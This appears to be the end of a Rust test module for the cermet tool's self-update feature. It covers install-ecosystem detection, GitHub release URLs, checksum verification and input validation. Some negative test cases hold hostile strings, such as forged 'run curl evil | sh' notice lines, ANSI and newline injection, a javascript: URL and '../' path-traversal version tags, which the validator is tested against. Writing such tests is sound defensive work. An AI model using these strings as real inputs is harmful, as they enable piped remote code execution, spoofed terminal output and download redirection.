    /// RESOLVES — `$CARGO_HOME/bin`, or `~/.cargo/bin` when no `$CARGO_HOME` is declared. The
    /// delegation also carries the STABLE path that ecosystem keeps cermet at, which is what the
    /// `setup` step must name: a bare `sudo cermet` resolves against sudo's own PATH, which on Linux
    /// excludes `~/.cargo/bin` entirely and can land on the older published copy.
    #[test]
    fn a_cermet_running_out_of_cargos_bin_belongs_to_cargo() {
        let found = classify_ecosystem(
            Path::new("/home/ada/.cargo/bin/cermet"),
            &env(None, Some("/home/ada"), None),
        )
        .expect("a binary in ~/.cargo/bin is cargo's");
        assert_eq!(found.ecosystem, Ecosystem::Cargo);
        assert_eq!(found.entry, Path::new("/home/ada/.cargo/bin/cermet"));

        // A declared $CARGO_HOME is where cargo installs, wherever that is.
        let declared = classify_ecosystem(
            Path::new("/opt/rust/cargo/bin/cermet"),
            &env(Some("/opt/rust/cargo"), Some("/home/ada"), None),
        )
        .expect("$CARGO_HOME/bin is cargo's");
        assert_eq!(declared.ecosystem, Ecosystem::Cargo);
        assert_eq!(declared.entry, Path::new("/opt/rust/cargo/bin/cermet"));

        // …and the default location is still cargo's even when $CARGO_HOME points elsewhere now:
        // that binary was installed by cargo and nothing else writes there.
        assert_eq!(
            classify_ecosystem(
                Path::new("/home/ada/.cargo/bin/cermet"),
                &env(Some("/opt/rust/cargo"), Some("/home/ada"), None)
            )
            .map(|found| found.ecosystem),
            Some(Ecosystem::Cargo)
        );
    }

    /// Forward-provisioned: no formula exists yet, and the branch exists BEFORE one does so that no
    /// `brew install` ever meets an updater that would write over Homebrew's files behind its back.
    /// Homebrew's `bin/cermet` is a symlink into the Cellar, which is why the caller resolves the
    /// running path before asking: the question is where the file lives, not what name reached it.
    #[test]
    fn a_cermet_running_out_of_a_homebrew_cellar_belongs_to_homebrew() {
        for (cellar, entry) in [
            (
                "/opt/homebrew/Cellar/cermet/0.1.1/bin/cermet",
                "/opt/homebrew/bin/cermet",
            ),
            (
                "/usr/local/Cellar/cermet/0.1.1/bin/cermet",
                "/usr/local/bin/cermet",
            ),
        ] {
            let found = classify_ecosystem(Path::new(cellar), &env(None, Some("/home/ada"), None))
                .unwrap_or_else(|| panic!("{cellar} is a Homebrew Cellar path"));
            assert_eq!(found.ecosystem, Ecosystem::Homebrew, "{cellar}");
            // The version-stamped Cellar path is gone after `brew upgrade`; the prefix's own
            // `bin/cermet` link is the stable name the setup step can still be told to run.
            assert_eq!(found.entry, Path::new(entry), "{cellar}");
        }
        let declared = classify_ecosystem(
            Path::new("/home/linuxbrew/.linuxbrew/Cellar/cermet/0.1.1/bin/cermet"),
            &env(None, None, Some("/home/linuxbrew/.linuxbrew")),
        )
        .expect("$HOMEBREW_PREFIX/Cellar is Homebrew's");
        assert_eq!(declared.ecosystem, Ecosystem::Homebrew);
        assert_eq!(
            declared.entry,
            Path::new("/home/linuxbrew/.linuxbrew/bin/cermet")
        );
    }

    /// The delegation is read off the INSTALLED LOCATION, never off the environment. A box with
    /// `~/.cargo/bin` on its PATH and a Homebrew prefix present still updates through Cermet's own
    /// channel when the binary that is RUNNING is the one Cermet published.
    #[test]
    fn an_install_cermet_published_is_never_delegated_because_the_env_mentions_cargo_or_brew() {
        let noisy = env(
            Some("/home/ada/.cargo"),
            Some("/home/ada"),
            Some("/opt/homebrew"),
        );
        for ours in [
            "/usr/local/bin/cermet",
            "/usr/bin/cermet",
            "/opt/cermet/bin/cermet",
            "/home/ada/.local/bin/cermet",
        ] {
            assert!(
                classify_ecosystem(Path::new(ours), &noisy).is_none(),
                "{ours} is an install cermet publishes and updates itself"
            );
        }
        // A Homebrew PREFIX is not a Homebrew install: only the Cellar holds a formula's files, and
        // `/opt/homebrew/bin/cermet` with nothing behind it in the Cellar is somebody's own copy.
        assert!(classify_ecosystem(Path::new("/opt/homebrew/bin/cermet"), &noisy).is_none());
    }

    /// An empty environment variable is not a declaration — it must never become a directory that
    /// matches half the filesystem (the same rule `origin` follows for the origin override).
    #[test]
    fn an_empty_environment_value_names_no_directory() {
        let empty = env(Some(""), Some(""), Some(""));
        for path in ["/bin/cermet", "/Cellar/cermet", "/usr/local/bin/cermet"] {
            assert!(
                classify_ecosystem(Path::new(path), &empty).is_none(),
                "{path}"
            );
        }
    }

    /// What the operator reads: the ecosystem's OWN command, then the `setup` step that carries the
    /// new bytes into the SYSTEM install — and nothing that claims Cermet did something.
    ///
    /// Both steps are needed and neither is optional. `cargo install` / `brew upgrade` replace the
    /// ecosystem's own file; the root-owned published copy the daemon runs, the service units and
    /// the custody layout are converged by `cermet setup`, which is why a package upgrade alone
    /// leaves the running daemon on the old published binary.
    #[test]
    fn the_delegation_hands_over_the_ecosystems_command_and_then_the_setup_step() {
        let cargo = render_delegation(
            &Delegation {
                ecosystem: Ecosystem::Cargo,
                entry: PathBuf::from("/home/ada/.cargo/bin/cermet"),
            },
            None,
        );
        assert!(cargo.contains("installed via cargo"), "{cargo}");
        assert!(cargo.contains("cargo install --locked cermet"), "{cargo}");
        assert!(
            cargo.contains("cargo install --locked --path crates/cermet-bin"),
            "the source-checkout form is offered too: {cargo}"
        );
        assert!(
            cargo.contains("sudo /home/ada/.cargo/bin/cermet setup"),
            "the second step names the ecosystem's own path, not a bare `cermet`: {cargo}"
        );

        let brew = render_delegation(
            &Delegation {
                ecosystem: Ecosystem::Homebrew,
                entry: PathBuf::from("/opt/homebrew/bin/cermet"),
            },
            None,
        );
        assert!(brew.contains("installed via Homebrew"), "{brew}");
        assert!(brew.contains("brew upgrade cermet"), "{brew}");
        assert!(
            brew.contains("sudo /opt/homebrew/bin/cermet setup"),
            "{brew}"
        );

        for text in [&cargo, &brew] {
            assert!(
                text.contains("system install"),
                "the second step says what it is for: {text}"
            );
            let lowered = text.to_lowercase();
            for acted in [
                "downloaded",
                "verified",
                "restarted",
                "nothing was published",
            ] {
                assert!(
                    !lowered.contains(acted),
                    "{acted:?} claims an action this command did not take: {text}"
                );
            }
        }
    }

    /// Two installs coexisting is a fact the operator is TOLD, never one this command resolves:
    /// picking one to overwrite is exactly the behind-the-back write the delegation exists to avoid.
    #[test]
    fn a_second_install_is_named_and_left_alone() {
        let text = render_delegation(
            &Delegation {
                ecosystem: Ecosystem::Cargo,
                entry: PathBuf::from("/home/ada/.cargo/bin/cermet"),
            },
            Some(Path::new("/usr/bin/cermet")),
        );
        assert!(text.contains("/usr/bin/cermet"), "{text}");
        assert!(text.contains("installed via cargo"), "{text}");
    }

    /// The second-install check is over candidate paths, so the both-exist case is drivable without
    /// a real `/usr/local/bin`: a candidate that IS the running file is not a second install, and a
    /// candidate that is not there at all is not one either.
    #[test]
    fn a_candidate_that_is_the_running_binary_or_absent_is_not_a_second_install() {
        let dir = tempfile::tempdir().unwrap();
        let running = dir.path().join("running-cermet");
        std::fs::write(&running, b"#!/bin/sh\n").unwrap();
        let running = std::fs::canonicalize(&running).unwrap();

        let other = dir.path().join("published-cermet");
        std::fs::write(&other, b"#!/bin/sh\n").unwrap();
        assert_eq!(
            coexisting_install(&running, std::slice::from_ref(&other)),
            Some(other.clone())
        );

        // A published path that is a link to the very file now running is ONE install, not two.
        let linked = dir.path().join("linked-cermet");
        std::os::unix::fs::symlink(&running, &linked).unwrap();
        assert_eq!(coexisting_install(&running, &[linked]), None);

        assert_eq!(
            coexisting_install(&running, &[dir.path().join("absent-cermet")]),
            None
        );
    }

    #[test]
    fn a_version_with_no_artifact_for_this_target_is_its_own_state() {
        let release = release("0.1.1");
        assert!(matches!(
            plan("0.1.0", &release, Some("linux_riscv64"), Channel::Tarball),
            Plan::NoArtifactForTarget { .. }
        ));
        // An unresolvable host target is the same answer, and never a panic.
        assert!(matches!(
            plan("0.1.0", &release, None, Channel::Tarball),
            Plan::NoArtifactForTarget { .. }
        ));
    }

    #[test]
    fn host_targets_match_the_get_cermet_table() {
        assert_eq!(resolve_target("linux", "x86_64"), Some("linux_amd64"));
        assert_eq!(resolve_target("linux", "aarch64"), Some("linux_arm64"));
        assert_eq!(resolve_target("macos", "aarch64"), Some("darwin_arm64"));
        // No darwin_amd64 is published, and no other platform has a release at all.
        assert_eq!(resolve_target("macos", "x86_64"), None);
        assert_eq!(resolve_target("freebsd", "x86_64"), None);
        assert_eq!(resolve_target("linux", "powerpc64"), None);
    }

    // ---- urls ---------------------------------------------------------------------------------

    /// ONE SOURCE, AND IT IS GITHUB. The metadata comes from the API host,
    /// the bytes from the release download host, and both are derived from the VENDORED slug — the
    /// response's own url fields are never followed.
    #[test]
    fn every_url_is_derived_from_the_vendored_slug_and_the_two_github_hosts() {
        let origin = github();
        assert_eq!(UPDATE_REPO, "suarezc/cermet");
        assert_eq!(
            origin.release_url(UPDATE_REPO),
            "https://api.github.com/repos/suarezc/cermet/releases/latest"
        );
        assert_eq!(
            origin.asset_url(UPDATE_REPO, "0.1.1", "SHA256SUMS"),
            "https://github.com/suarezc/cermet/releases/download/v0.1.1/SHA256SUMS"
        );
        assert_eq!(
            origin.asset_url(UPDATE_REPO, "0.1.1", "cermet_0.1.1_amd64.deb"),
            "https://github.com/suarezc/cermet/releases/download/v0.1.1/cermet_0.1.1_amd64.deb"
        );
        assert_eq!(
            origin.release_page(UPDATE_REPO, "0.1.1"),
            "https://github.com/suarezc/cermet/releases/tag/v0.1.1"
        );
        assert_eq!(
            origin.label(UPDATE_REPO),
            "https://github.com/suarezc/cermet/releases"
        );
    }

    /// THE DECLARED TEST DOOR. One override remaps BOTH halves, so a
    /// `file://` fixture tree mimicking `repos/<slug>/releases/latest` plus the release's assets
    /// exercises the whole flow with no network. An EMPTY value is not an override.
    #[test]
    fn the_origin_override_remaps_both_halves_and_an_empty_value_is_not_one() {
        let fixture = origin(Some("file:///var/tmp/dl".to_string()));
        assert_eq!(
            fixture.release_url(UPDATE_REPO),
            "file:///var/tmp/dl/repos/suarezc/cermet/releases/latest"
        );
        assert_eq!(
            fixture.asset_url(UPDATE_REPO, "9.9.9", "SHA256SUMS"),
            "file:///var/tmp/dl/suarezc/cermet/releases/download/v9.9.9/SHA256SUMS"
        );
        // A trailing slash resolves to exactly the same urls.
        assert_eq!(
            origin(Some("file:///var/tmp/dl/".to_string())).release_url(UPDATE_REPO),
            fixture.release_url(UPDATE_REPO)
        );
        assert_eq!(origin(Some(String::new())), github());
        assert_eq!(origin(Some("   ".to_string())), github());
        assert_eq!(origin(None), github());
        // A fixture origin publishes no https release page, so the notice has no url to print
        // rather than a github.com one it did not get its bytes from.
        let release =
            parse_release(&release_json("9.9.9", "ordinary"), &fixture, UPDATE_REPO).unwrap();
        assert_eq!(release.notes, None);
    }

    // ---- verification -------------------------------------------------------------------------

    #[test]
    fn the_checksum_is_of_the_bytes_that_arrived() {
        // The empty string's sha256 — a fixed, externally checkable value.
        assert_eq!(
            sha256_hex(b""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert_eq!(
            sha256_hex(b"cermet"),
            sha256_hex("cermet".as_bytes()),
            "the digest is a pure function of the bytes"
        );
    }

    #[test]
    fn a_partial_or_swapped_download_is_refused_and_says_both_sums() {
        let expected = sha256_hex(b"the whole artifact");
        let arrived = b"the whole artifa";
        let refusal = verify_bytes("cermet_0.1.1_linux_amd64.tar.gz", arrived, &expected)
            .expect_err("truncated bytes must refuse");
        assert!(refusal.contains("does not match"), "{refusal}");
        assert!(
            refusal.contains(&expected),
            "the refusal names what was expected: {refusal}"
        );
        assert!(
            refusal.contains(&sha256_hex(arrived)),
            "the refusal names what arrived: {refusal}"
        );
        assert!(
            refusal.contains("nothing was published"),
            "the refusal says the installed binary is untouched: {refusal}"
        );
        verify_bytes("c.tar.gz", b"the whole artifact", &expected).unwrap();
    }

    /// Coreutils' own format, both spellings, headers skipped — and a document with NO checksum
    /// lines is refused, because an HTML error page served with 200 must never read as a checksum.
    #[test]
    fn sha256sums_parses_both_spellings_and_refuses_a_document_with_none() {
        let sums = parse_sha256sums(&format!(
            "# cermet 0.1.1\n{SUM_A}  cermet_0.1.1_linux_amd64.tar.gz\n{SUM_B} *cermet_0.1.1_amd64.deb\n\n"
        ))
        .unwrap();
        assert_eq!(sums["cermet_0.1.1_linux_amd64.tar.gz"], SUM_A);
        assert_eq!(sums["cermet_0.1.1_amd64.deb"], SUM_B);
        assert!(parse_sha256sums("<!doctype html><title>404</title>").is_err());
        assert!(parse_sha256sums("").is_err());
    }

    /// The checksum comes from the release's OWN `SHA256SUMS` asset, and every way that can fail is
    /// the same fail-closed answer: nothing is installed.
    #[test]
    fn the_checksum_is_resolved_from_the_releases_own_sha256sums() {
        let origin = github();
        let asked = std::cell::RefCell::new(Vec::new());
        let serve = |url: &str| {
            asked.borrow_mut().push(url.to_string());
            Ok(Fetched::Body(
                format!("{SUM_A}  cermet_0.1.1_linux_amd64.tar.gz\n").into_bytes(),
            ))
        };
        let artifact = obtain_artifact(
            &origin,
            UPDATE_REPO,
            "0.1.1",
            "cermet_0.1.1_linux_amd64.tar.gz",
            &serve,
        )
        .unwrap();
        assert_eq!(artifact.sha256, SUM_A);
        assert_eq!(
            asked.borrow().as_slice(),
            [origin.asset_url(UPDATE_REPO, "0.1.1", "SHA256SUMS")],
            "one parameterless GET, at the deterministic asset url"
        );

        type Serve<'a> = &'a dyn Fn(&str) -> Result<Fetched, String>;
        let cases: [(&str, Serve, &str); 4] = [
            (
                "absent",
                &|_: &str| Ok(Fetched::Missing),
                "publishes no SHA256SUMS",
            ),
            (
                "unreachable",
                &|_: &str| Err("connection refused".to_string()),
                "cannot reach",
            ),
            (
                "an html error page",
                &|_: &str| Ok(Fetched::Body(b"<!doctype html>".to_vec())),
                "not a readable SHA256SUMS",
            ),
            (
                "naming other files only",
                &|_: &str| {
                    Ok(Fetched::Body(
                        format!("{SUM_A}  something-else\n").into_bytes(),
                    ))
                },
                "names no cermet_0.1.1_linux_amd64.tar.gz",
            ),
        ];
        for (label, fetch, expected) in cases {
            let refusal = obtain_artifact(
                &origin,
                UPDATE_REPO,
                "0.1.1",
                "cermet_0.1.1_linux_amd64.tar.gz",
                fetch,
            )
            .unwrap_err();
            assert!(refusal.contains(expected), "{label}: {refusal}");
            assert!(refusal.contains("untouched"), "{label}: {refusal}");
        }
    }

    /// Every surface prints the SAME word, and the word says what it actually established: one
    /// release vouches for the version, the checksums and the bytes together — which is integrity,
    /// not authorship.
    #[test]
    fn each_verification_mode_states_what_it_actually_established() {
        assert_eq!(Verification::GithubRelease.word(), "github-release");
        assert_eq!(Verification::NoArtifact.word(), "no-artifact");

        let released = Verification::GithubRelease.line();
        assert!(released.contains("github-release"), "{released}");
        assert!(
            released.contains("the GitHub release"),
            "it names the single source: {released}"
        );
        assert!(
            released.contains("not who authored it"),
            "it says what a checksum does NOT prove: {released}"
        );
        assert!(
            Verification::NoArtifact
                .line()
                .contains("nothing to install"),
            "the other state says why it resolved no checksum"
        );
        for line in [
            Verification::GithubRelease.line(),
            Verification::NoArtifact.line(),
        ] {
            for gone in [
                "cross-check",
                "single-source",
                "cermet.dev",
                "second source",
            ] {
                assert!(
                    !line.contains(gone),
                    "{gone:?} is dual-source vocabulary this build no longer has: {line}"
                );
            }
        }
    }

    // ---- the unpacked payload -----------------------------------------------------------------

    fn stage_payload(dir: &std::path::Path) {
        let mut file = std::fs::File::create(dir.join("cermet")).unwrap();
        file.write_all(b"#!/bin/sh\n").unwrap();
        drop(file);
        std::fs::set_permissions(
            dir.join("cermet"),
            std::os::unix::fs::PermissionsExt::from_mode(0o755),
        )
        .unwrap();
        std::os::unix::fs::symlink("cermet", dir.join("cermetd")).unwrap();
        std::os::unix::fs::symlink("cermet", dir.join("git-remote-cermet")).unwrap();
    }

    #[test]
    fn the_one_binary_payload_shape_is_asserted_before_anything_is_published() {
        let dir = tempfile::tempdir().unwrap();
        stage_payload(dir.path());
        assert_eq!(
            verify_payload_layout(dir.path()).unwrap(),
            dir.path().join("cermet")
        );

        // An alias pointing anywhere but at the relative name `cermet` is refused: a downloaded
        // artifact whose link escapes its own directory would have setup publish, or point at,
        // something the release did not ship.
        let escaping = tempfile::tempdir().unwrap();
        stage_payload(escaping.path());
        std::fs::remove_file(escaping.path().join("cermetd")).unwrap();
        std::os::unix::fs::symlink("/usr/bin/cermet", escaping.path().join("cermetd")).unwrap();
        assert!(verify_payload_layout(escaping.path()).is_err());

        // A byte-copy alias is not the shipped shape either.
        let copied = tempfile::tempdir().unwrap();
        stage_payload(copied.path());
        std::fs::remove_file(copied.path().join("git-remote-cermet")).unwrap();
        std::fs::copy(
            copied.path().join("cermet"),
            copied.path().join("git-remote-cermet"),
        )
        .unwrap();
        assert!(verify_payload_layout(copied.path()).is_err());

        // No target at all.
        let empty = tempfile::tempdir().unwrap();
        assert!(verify_payload_layout(empty.path()).is_err());
    }

    // ---- what the operator reads --------------------------------------------------------------

    #[test]
    fn the_no_channel_state_is_a_plain_report_not_an_error() {
        let url = github().release_url(UPDATE_REPO);
        let text = render_no_channel(&url, "0.1.0");
        assert!(
            text.contains("no update channel is published yet"),
            "{text}"
        );
        assert!(text.contains(&url), "{text}");
        assert!(text.contains("0.1.0"), "{text}");
        // It is a state, not a failure: no refusal vocabulary, no stack of causes.
        assert!(!text.contains("REFUSED"), "{text}");
        assert!(!text.to_lowercase().contains("error"), "{text}");
    }

    /// Same-release checksums prove integrity, never authenticity. The output says exactly that and
    /// never reaches for signing vocabulary the product does not have.
    #[test]
    fn the_integrity_claim_is_never_overstated() {
        let release = release("0.1.1");
        let label = github().label(UPDATE_REPO);
        let plan = plan("0.1.0", &release, Some("linux_amd64"), Channel::Tarball);
        let artifact = Artifact {
            file: "cermet_0.1.1_linux_amd64.tar.gz".to_string(),
            sha256: SUM_A.to_string(),
        };
        let surfaces = [
            render_plan(&plan, &label, Some(&artifact)),
            consent_paragraph(
                &label,
                "cermet_0.1.1_linux_amd64.tar.gz",
                "0.1.0",
                "0.1.1",
                Channel::Tarball,
            ),
            consent_paragraph(
                &label,
                "cermet_0.1.1_amd64.deb",
                "0.1.0",
                "0.1.1",
                Channel::Deb,
            ),
            render_applied("0.1.0", "0.1.1", "cermet_0.1.1_linux_amd64.tar.gz"),
            Verification::GithubRelease.line(),
        ];
        for text in surfaces {
            let lowered = text.to_lowercase();
            // "authenticity" is allowed only in the phrase that DENIES it, asserted below.
            let lowered = lowered.replace("integrity, not authenticity", "");
            for overclaim in ["signed", "signature", "authentic", "trusted publisher"] {
                assert!(
                    !lowered.contains(overclaim),
                    "{overclaim:?} overstates a release checksum: {text}"
                );
            }
        }
        assert!(
            render_applied("0.1.0", "0.1.1", "c.tar.gz").contains("integrity, not authenticity"),
            "the applied receipt states what the checksum proves"
        );
    }

    #[test]
    fn the_applied_receipt_states_the_restart_consequence() {
        let text = render_applied("0.1.0", "0.1.1", "cermet_0.1.1_linux_amd64.tar.gz");
        assert!(text.contains("updated 0.1.0 → 0.1.1"), "{text}");
        assert!(text.contains("cermetd was restarted"), "{text}");
        assert!(
            text.contains("MCP bridge") || text.contains("mcp bridge"),
            "a live agent session keeps the old tool surface until its bridge restarts: {text}"
        );
    }

    /// The consent paragraph is where a human sees WHAT is about to be installed and from WHERE —
    /// which is what makes a redirected `$CERMET_UPDATE_ORIGIN` visible rather than silent, and is
    /// half of what bounds that door (the other half being the sudo prompt it precedes).
    #[test]
    fn the_consent_paragraph_names_the_origin_the_artifact_and_the_channel() {
        let fixture = origin(Some("file:///var/tmp/dl".to_string()));
        let source = fixture.asset_url(UPDATE_REPO, "9.9.9", "cermet_9.9.9_linux_amd64.tar.gz");
        let tarball = consent_paragraph(
            &source,
            "cermet_9.9.9_linux_amd64.tar.gz",
            "0.1.0",
            "9.9.9",
            Channel::Tarball,
        );
        assert!(tarball.contains("file:///var/tmp/dl"), "{tarball}");
        assert!(
            tarball.contains("cermet_9.9.9_linux_amd64.tar.gz"),
            "{tarball}"
        );
        assert!(tarball.contains("administrator access"), "{tarball}");
        // On a packaged box the human is consenting to a PACKAGE MANAGER run, and the paragraph
        // says so in the package manager's own name.
        let deb = consent_paragraph(
            &source,
            "cermet_9.9.9_amd64.deb",
            "0.1.0",
            "9.9.9",
            Channel::Deb,
        );
        assert!(deb.contains("dpkg"), "{deb}");
        assert!(deb.contains("cermet_9.9.9_amd64.deb"), "{deb}");
    }

    #[test]
    fn check_reports_what_the_release_publishes_and_how_to_install_it() {
        let release = release("0.1.1");
        let label = github().label(UPDATE_REPO);
        let artifact = Artifact {
            file: "cermet_0.1.1_linux_amd64.tar.gz".to_string(),
            sha256: SUM_A.to_string(),
        };
        let available = render_plan(
            &plan("0.1.0", &release, Some("linux_amd64"), Channel::Tarball),
            &label,
            Some(&artifact),
        );
        assert!(available.contains("0.1.1"), "{available}");
        assert!(
            available.contains("cermet_0.1.1_linux_amd64.tar.gz"),
            "{available}"
        );
        assert!(
            available.contains(SUM_A),
            "--check reports the checksum an install would verify against: {available}"
        );
        assert!(available.contains("cermet update"), "{available}");

        let current = render_plan(
            &plan("0.1.1", &release, Some("linux_amd64"), Channel::Tarball),
            &label,
            None,
        );
        assert!(current.contains("is current"), "{current}");

        let unsupported = render_plan(
            &plan("0.1.0", &release, Some("linux_riscv64"), Channel::Tarball),
            &label,
            None,
        );
        assert!(unsupported.contains("linux_riscv64"), "{unsupported}");
        assert!(unsupported.contains("untouched"), "{unsupported}");
    }

    // ---- the fetch seam, over a fixture origin -------------------------------------------------

    /// The whole flow is exercised with no network: a `file://` origin is a declared setting
    /// (`$CERMET_UPDATE_ORIGIN`), and it is what the container upgrade leg drives too. The fixture
    /// tree mimics BOTH halves — `repos/<slug>/releases/latest` and the release's assets.
    #[test]
    fn a_file_origin_serves_a_whole_release_and_reports_a_missing_one() {
        let dir = tempfile::tempdir().unwrap();
        let fixture = origin(Some(format!("file://{}", dir.path().display())));

        assert!(matches!(
            fetch(&fixture.release_url(UPDATE_REPO)).unwrap(),
            Fetched::Missing
        ));
        assert!(obtain_release(&fixture, UPDATE_REPO, &fetch)
            .unwrap()
            .is_none());

        let api = dir.path().join("repos/suarezc/cermet/releases");
        std::fs::create_dir_all(&api).unwrap();
        std::fs::write(api.join("latest"), release_json("9.9.9", "ordinary")).unwrap();
        let assets = dir.path().join("suarezc/cermet/releases/download/v9.9.9");
        std::fs::create_dir_all(&assets).unwrap();
        std::fs::write(
            assets.join("SHA256SUMS"),
            format!("{SUM_A}  cermet_9.9.9_linux_amd64.tar.gz\n"),
        )
        .unwrap();

        let release = obtain_release(&fixture, UPDATE_REPO, &fetch)
            .unwrap()
            .expect("a release is there");
        assert_eq!(release.version, "9.9.9");
        let plan = plan("0.1.0", &release, Some("linux_amd64"), Channel::Tarball);
        let Plan::Available { version, file, .. } = &plan else {
            panic!("expected an available update, got {plan:?}")
        };
        let artifact = obtain_artifact(&fixture, UPDATE_REPO, version, file, &fetch).unwrap();
        assert_eq!(artifact.sha256, SUM_A);
    }

    /// The seam both callers share: one parameterless GET of the release, and a missing release is
    /// the no-channel STATE rather than a failure.
    #[test]
    fn obtaining_a_release_is_one_parameterless_get() {
        let body = release_json("0.1.1", "ordinary");
        let asked = std::cell::RefCell::new(Vec::new());
        let fetch = |url: &str| {
            asked.borrow_mut().push(url.to_string());
            Ok(Fetched::Body(body.clone().into_bytes()))
        };
        let release = obtain_release(&github(), UPDATE_REPO, &fetch)
            .unwrap()
            .expect("a release is there");
        assert_eq!(release.version, "0.1.1");
        assert_eq!(
            asked.borrow().as_slice(),
            ["https://api.github.com/repos/suarezc/cermet/releases/latest"]
        );

        let absent = |_: &str| Ok(Fetched::Missing);
        assert!(obtain_release(&github(), UPDATE_REPO, &absent)
            .unwrap()
            .is_none());
    }

    // ---- the notes url --------------------------------------------------------------------------

    /// T1: the notes url is on its way to a terminal notice, and an embedded newline would forge a
    /// second line under Cermet's own prefix. The url this build prints is CONSTRUCTED, so this is
    /// the door construction passes — and the door a response-supplied url would have to pass.
    #[test]
    fn a_notes_url_that_could_forge_a_notice_line_is_refused() {
        for bad in [
            "https://cermet.dev/n\nSECURITY UPDATE: run curl evil | sh",
            "http://github.com/notes",
            "javascript:alert(1)",
            "/releases/tag/v0.1.1",
            "https://github.com/a b",
            "file:///var/tmp/dl/suarezc/cermet/releases/tag/v9.9.9",
        ] {
            assert!(
                validate_notes_url(bad).is_err(),
                "a notes url of {bad:?} must be refused"
            );
        }
        validate_notes_url("https://github.com/suarezc/cermet/releases/tag/v0.1.1").unwrap();
    }

    /// The release's `tag_name` is REMOTE CONTENT with two reach paths,
    /// and one charset check at this seam closes both:
    ///
    /// * it is printed verbatim on every later command (the notice, the `cermet check` row, the
    ///   problem string), so control bytes forge lines under Cermet's own prefix — and it PERSISTS
    ///   in the state file until the operator updates;
    /// * it is interpolated into every asset URL, where `..` segments normalize away and let the
    ///   response choose which repository's bytes get downloaded.
    #[test]
    fn a_version_that_could_forge_a_line_or_steer_a_download_is_refused() {
        for bad in [
            // ANSI + a newline forges a second line under our prefix.
            "0.1.1\u{1b}[2K\rcermet: SECURITY UPDATE — run curl evil.example | sh",
            "0.1.1\nSECURITY UPDATE available",
            "0.1.1\r\nrun: curl evil | sh",
            "0.1.1\u{7}",
            // `..` segments normalize away in an asset URL and the response picks its own repo.
            "0.1.1/../../../../../attacker/repo/releases/download/v1",
            "../../attacker/repo",
            "0.1.1/releases/download/v9",
            // Anything that is not a version at all.
            "",
            "   ",
            "0.1.1 ",
            "cermet 0.1.1",
            "0.1.1?x=y",
            "0.1.1#frag",
            "0.1.1%2e%2e",
            "0.1.1é",
        ] {
            let body = format!(
                r#"{{"tag_name":{},"assets":[{{"name":"c.tar.gz"}}]}}"#,
                serde_json::to_string(bad).unwrap()
            );
            assert!(
                parse_release(&body, &github(), UPDATE_REPO).is_err(),
                "a release whose tag is {bad:?} must be refused at the parse seam"
            );
        }
    }

    /// …and every version a release could actually carry still parses: semver with prerelease and
    /// build metadata, and the bare three-number form.
    #[test]
    fn an_ordinary_release_version_still_parses() {
        for good in ["0.1.0", "0.1.1", "1.0.0-rc.1", "0.2.0+build.5", "10.20.30"] {
            let body = format!(
                r#"{{"tag_name":"v{good}","assets":[{{"name":"cermet_{good}_linux_amd64.tar.gz"}}]}}"#
            );
            assert_eq!(
                parse_release(&body, &github(), UPDATE_REPO)
                    .unwrap_or_else(|why| panic!("{good:?} must parse: {why}"))
                    .version,
                good
            );
        }
    }
}
